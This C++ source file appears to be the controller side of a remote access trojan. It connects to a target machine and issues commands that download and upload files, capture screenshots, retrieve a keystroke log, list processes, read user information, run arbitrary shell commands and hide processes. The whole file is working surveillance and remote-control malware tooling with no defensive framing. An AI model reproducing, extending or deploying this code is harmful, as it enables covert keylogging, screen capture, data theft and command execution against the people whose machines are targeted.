#include "stdafx.h"
#include "client.h"
#define DEFAULT_REMOTE_PORT 27185

char tempc[BUFLEN + 4];
FILE *tempcfp = NULL;
const char keyboard_save_file[] = "key.log";

client::client(){
	this->sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (this->sclient == INVALID_SOCKET) {
		return;
	}
}

client::~client()
{
}

bool client::Tryconnect(const char* target_ip){
	char* tempChar = (char*)calloc(256, sizeof(char));
	memcpy(tempChar, target_ip, 256);
	this->target_ip = tempChar;
	sockaddr_in serAddr;
	serAddr.sin_family = AF_INET;
	serAddr.sin_port = htons(DEFAULT_REMOTE_PORT);
	serAddr.sin_addr.S_un.S_addr = inet_addr(target_ip);
	//void* binaryIP = NULL;
	//InetPton(AF_INET, cur_target.ip, binaryIP);
	//serAddr.sin_addr.S_un.S_addr = (ULONG) binaryIP;
	this->sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR) {
		closesocket(sclient);
		return false;
	}
	char recData[BUFLEN];
	int recv_value = recv_s(recData, BUFLEN);
	if (recv_value == SOCKET_ERROR)
		return false;

	if (!strncmp(recData, "200-success", recv_value)) {
		return true;
	}
	else {
		return false;
	}
}

void client::closeConnection() {
	closesocket(sclient);
	sclient = 0;
}

void client::getFilename(char *buf){
	size_t len = strlen(buf);
	size_t temp = len;
	while (temp--) {
		if (buf[temp] == '\\')
			break;
	}
	strncpy(buf, buf + temp + 1, len - temp);
	buf[len - temp] = '\0';
}
bool client::sendFile(const char* remotePath, const char* localPath) {
	char recOper[BUFLEN];
	memset(recOper, 0, BUFLEN);
	FILE *fp = fopen(localPath, "rb");
	if (fp == NULL) {
		return false;
	}
	char* command;
	command = new char[strlen("SENDFILE") + strlen(remotePath) + 1];
	strcpy(command, "SENDFILE");
	strcat(command, remotePath);
	if (send_s(command, strlen(command)) == SOCKET_ERROR)
		return false;
		int recvFlag = recv_s(recOper, BUFLEN);
	if (recvFlag == SOCKET_ERROR || recvFlag == 0)
		return false;
	else if (!strncmp(recOper, "OPENFAIL", 8)) {
		return false;
	}
	fseek(fp, 0, SEEK_END);
	long length = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	char fileLength[BUFLEN];
	memset(fileLength, 0, BUFLEN);
	memcpy(fileLength, (void*)&length, 8);
	// send file size
	send_s(fileLength, 8);
	// send file
	char send_buf[BUFLEN];
	unsigned int readLen = 0;
	do {
		memset(send_buf, 0, BUFLEN);
		if (SOCKET_ERROR == recv_s(NULL, 0)) {
			fclose(fp);
			return false;
		}
		readLen = readFileIntoBuf(&fp, send_buf, BUFLEN);
		std::cout << send_buf << std::endl;
		std::cout << readLen << std::endl;
		if (SOCKET_ERROR == send_s(send_buf, readLen)) {
			fclose(fp);
			return false;
		}
	} while (readLen != SOCKET_ERROR && readLen != 0);
	fclose(fp);
	return true;
	/*
	fread(recOper, sizeof(char), BUFLEN, fp);
	std::cout << recOper;
	return true;
	*/
}

bool client::getFile(const char* remotePath, const char* localPath) {
	char recOper[BUFLEN];
	FILE *fp = fopen(localPath, "wb");
	if (fp == NULL) {
		return false;
	}
	char* command;
	command = new char[strlen("GETFILE") + strlen(remotePath) + 1];
	strcpy(command, "GETFILE");
	strcat(command, remotePath);
	if (send_s(command, strlen(command)) == SOCKET_ERROR)
		return false;

	int recvFlag = recv_s(recOper, BUFLEN);
	if (recvFlag == SOCKET_ERROR || recvFlag == 0)
		return false;
	else if (!strncmp(recOper, "OPENFAIL", 8)) {
		return false;
	}

	long filelength = *(long *)(recOper + 8);

	// receive binary file
	while (true) {
		if (SOCKET_ERROR == send_s(NULL, 0))
			return false;

		Sleep(5);
		int recvFlag = recv_s(recOper, BUFLEN);
		Sleep(5);
		if (recvFlag == SOCKET_ERROR) {
			fclose(fp);
			return false;
		}
		else if (recvFlag == 0) {
			if (filelength == 0) {
				fflush(fp);
				fclose(fp);
				return true;
			}
			return false;
		}
		fwrite(recOper, 1, recvFlag, fp);
		fflush(fp);
		filelength -= recvFlag;
	}
	fclose(fp);
	return true;
}
bool client::getScreenShot(){
	char recOper[BUFLEN];
	memset(recOper, 0, BUFLEN);
	char* command = "SCREENSHOT";
	if (send_s(command, strlen(command)) == SOCKET_ERROR)
		return false;
	if (recv_s(recOper, BUFLEN) == SOCKET_ERROR)
		return false;

	if (strcmp(recOper, "SCREENSHOT SUCCEED") != 0) {
		return false;
	}

	/* write binary picture
	example: remote host name is forec
	save the screenshot as %DIR%/forec/2016-09-16 10:41:32.bmp
	*/

	
	std::time_t rawtime;
	std::tm* timeinfo;
	char timeBuffer[80];

	std::time(&rawtime);
	timeinfo = std::localtime(&rawtime);

	std::strftime(timeBuffer, 80, "%Y-%m-%d-%H-%M-%S", timeinfo);

	char* saveFileName = new char[strlen(target_ip) + strlen("-") + strlen(timeBuffer) + strlen(".bmp") + 1];
	strcpy(saveFileName, target_ip);
	strcat(saveFileName, "-");
	strcat(saveFileName, timeBuffer);
	strcat(saveFileName, ".bmp");
	FILE *fp = fopen(saveFileName, "wb");
	if (fp == NULL) {
		return false;
	}

	// send command to get saved screenshot
	command = "GETFILEscreen.bmp";
	if (send_s(command, strlen(command) + 1) == SOCKET_ERROR)
		return false;

	int recvFlag = recv_s(recOper, BUFLEN);
	if (recvFlag == SOCKET_ERROR || recvFlag == 0)
		return false;
	else if (!strncmp(recOper, "OPENFAIL", 8)) {
		return false;
	}
	long filelength = *(long *)(recOper + 8);
	// receive screenshot and write into binary picture
	while (true) {
		if (SOCKET_ERROR == send_s(NULL, 0))
			return false;

		Sleep(5);
		int recvFlag = recv_s(recOper, BUFLEN);
		Sleep(5);
		if (recvFlag == SOCKET_ERROR) {
			fclose(fp);
			return false;
		}
		else if (recvFlag == 0) {
			if (filelength == 0) {
				fflush(fp);
				fclose(fp);
				// open picture
				ShellExecute(NULL, "open", saveFileName, NULL,
					NULL, SW_SHOWNORMAL);
				return true;
			}
			return false;
		}
		fwrite(recOper, 1, recvFlag, fp);
		filelength -= recvFlag;
	}
	return true;
}
bool client::getKeyBoard(char *recOper){
	FILE *fp = fopen(keyboard_save_file, "wb");
	if (fp == NULL) {
		return false;
	}

	char* command("KEYBOARD");
	memset(recOper, 0, BUFLEN);
	if (send_s(command,
		strlen(command)) == SOCKET_ERROR) {
		return false;
	}

	int recvFlag = recv_s(recOper, BUFLEN);
	if (recvFlag == SOCKET_ERROR || recvFlag == 0)
		return false;
	else if (!strncmp(recOper, "OPENFAIL", 8)) {
		return false;
	}

	long filelength = *(long *)(recOper + 8);

	// receive binary file
	while (true) {
		if (SOCKET_ERROR == send_s(NULL, 0))
			return false;

		Sleep(5);
		int recvFlag = recv_s(recOper, BUFLEN);
		Sleep(5);
		if (recvFlag == SOCKET_ERROR) {
			fclose(fp);
			return false;
		}
		else if (recvFlag == 0) {
			if (filelength == 0) {
				fflush(fp);
				fclose(fp);
				break;
			}
			return false;
		}
		fwrite(recOper, 1, recvFlag, fp);
		fflush(fp);
		filelength -= recvFlag;
	}
	fclose(fp);
	ShellExecute(NULL, NULL, keyboard_save_file, NULL, NULL, SW_SHOWNORMAL);
	return true;

	/*
	if (recv_s(recOper, BUFLEN) == SOCKET_ERROR)
		printf("%s\n", recOper);
		return false;
	if (strncmp(recOper, "KEYBOARD FAILED", strlen("KEYBOARD FAILED")) == 0)
		printf("%s\n", recOper);
		return false;
	command = new char[strlen("type ") + strlen(keyboard_save_file) + 1];
	strcpy(command, "type ");
	strcat(command, keyboard_save_file);
	printf("%s\n", recOper);
	return sendCMD(*command, recOper);
	*/
}
bool client::getPSList(char *recOper){
	char* command("PSLIST");
	if (send_s(command,
		strlen(command) + 1) == SOCKET_ERROR) {
		return false;
	}
	if (recv_s(recOper, BUFLEN) == SOCKET_ERROR)
		return false;
	return true;
}
bool client::getUserName(char *recOper){
	char* command("PCINFO");
	if (send_s(command, strlen(command)+1) == SOCKET_ERROR)
		return false;
	if (recv_s(recOper, BUFLEN) == SOCKET_ERROR)
		return false;
	return true;
}
bool client::sendCMD(const char &command, char *recOper) {
	char* newcommand;
	newcommand = new char[strlen("RUNCMD") + strlen(&command) + 1];
	strcpy(newcommand, "RUNCMD");
	strcat(newcommand, &command);
	// newcommand = "RUNCMD" + command;
	if (send_s(newcommand,
		strlen(newcommand)+1) == SOCKET_ERROR)
		return false;
	if (SOCKET_ERROR == recv_s(NULL, 0))
		return false;
	tempcfp = fopen("temp.tmp", "wb");
	while (true) {
		if (SOCKET_ERROR == send_s(NULL, 0)) {
			fclose(tempcfp);
			return false;
		}
		int recvLen = recv_s(recOper, BUFLEN);
		if (recvLen == SOCKET_ERROR) {
			fclose(tempcfp);
			return false;
		}
		else if (recvLen == 0) {
			fflush(tempcfp);
			fclose(tempcfp);
			return true;
		}
		else {
			//printf("%s\n", recOper);
			fwrite(recOper, 1, recvLen, tempcfp);
		}
	}
	fclose(tempcfp);
	return true;
}
bool client::processHide(const char *pid) {
	char* command;
	command = new char[strlen("HIDEPROC") + strlen(pid) + 1];
	strcpy(command, "HIDEPROC");
	strcat(command, pid);
	if (send_s(command, strlen(command)) == SOCKET_ERROR)
		return false;
	return true;
}
bool client::popMessage(const char *message) {
	char* command;
	command = new char[strlen("MSGBOX") + strlen(message) + 1];
	strcpy(command, "MSGBOX");
	strcat(command, message);
	if (send_s(command, strlen(command)) == SOCKET_ERROR)
		return false;
	return true;
}
bool client::checkL(){
	char* command("PCINFO");
	char recOper[101];
	if (send_s(command
		, strlen(command)+1) == SOCKET_ERROR)
		return false;
	if (recv_s(recOper, 101) == SOCKET_ERROR)
		return false;
	return true;
}
int client::send_s(const char *buf, int sendlen){
	/* content check */
	memcpy(tempc, "FLAG", 4);
	if (buf) {
		memcpy(tempc + 4, buf, sendlen);
	}
	int realSendLen = send(sclient, tempc, sendlen + 4, 0);
	if (realSendLen == SOCKET_ERROR)
		return SOCKET_ERROR;
	return realSendLen - 4 >= 0 ? realSendLen : 0;
}
int client::recv_s(char *buf, unsigned int buflen){
	memset(buf, 0, buflen);
	int recvLen = recv(sclient, tempc, buflen + 4, 0);
	//printf("%s\n", tempc);
	if (recvLen == SOCKET_ERROR)
		return SOCKET_ERROR;
	if (recvLen < 4 || strncmp(tempc, "FLAG", 4) != 0) {
		return 0;
	}
	else {
		memcpy(buf, tempc + 4, recvLen - 4);
		//printf("%s\n", buf);
		return recvLen - 4;
	}
}

bool client::initWSA() {
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA data;
	if (WSAStartup(sockVersion, &data) != 0) {
		return false;
	}
	return true;
}

unsigned int client::readFileIntoBuf(FILE **fp, char *buf, unsigned int buflen) {
	size_t readLen = 0, index = 0;
	while ((readLen = fread(buf + index, sizeof(char), buflen - 4 - index, *fp)) != 0) {
		index += readLen;
		if (index == buflen - 4) {
			break;
		}
	}
	return index;
}

/*
bool client::getFile(const char &path){
char recOper[BUFLEN], filename[257];
strcpy(filename, &path);
getFilename(filename);
char* saveFileName;
//char* filesDirectory = "files\\";
saveFileName = new char[strlen(filename) + 1]; //strlen(filesDirectory)
//strcpy(saveFileName, filesDirectory);
strcpy(saveFileName, filename);
printf("%s\n", saveFileName);
FILE *fp = fopen(saveFileName, "wb");
if (fp == NULL) {
return false;
}
char* command;
command = new char[strlen("GETFILE") + strlen(&path) + 1];
strcpy(command, "GETFILE");
strcat(command, &path);
if (send_s(command, strlen(command)) == SOCKET_ERROR)
return false;

int recvFlag = recv_s(recOper, BUFLEN);
if (recvFlag == SOCKET_ERROR || recvFlag == 0)
return false;
else if (!strncmp(recOper, "OPENFAIL", 8)) {
return false;
}

long filelength = *(long *)(recOper + 8);

// receive binary file
while (true) {
if (SOCKET_ERROR == send_s(NULL, 0))
return false;

Sleep(5);
int recvFlag = recv_s(recOper, BUFLEN);
Sleep(5);
if (recvFlag == SOCKET_ERROR) {
fclose(fp);
return false;
}
else if (recvFlag == 0) {
if (filelength == 0) {
fflush(fp);
fclose(fp);
return true;
}
return false;
}
fwrite(recOper, 1, recvFlag, fp);
fflush(fp);
filelength -= recvFlag;
}
fclose(fp);
return true;
}
*/